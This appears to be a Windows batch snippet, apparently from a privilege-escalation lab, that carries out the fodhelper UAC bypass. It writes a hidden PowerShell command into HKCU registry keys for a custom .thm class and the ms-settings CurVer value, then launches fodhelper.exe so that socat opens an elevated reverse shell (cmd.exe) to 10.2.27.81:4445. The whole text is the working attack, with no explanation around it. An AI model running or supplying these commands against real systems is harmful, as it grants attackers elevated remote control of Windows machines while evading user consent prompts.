set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.2.27.81:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe
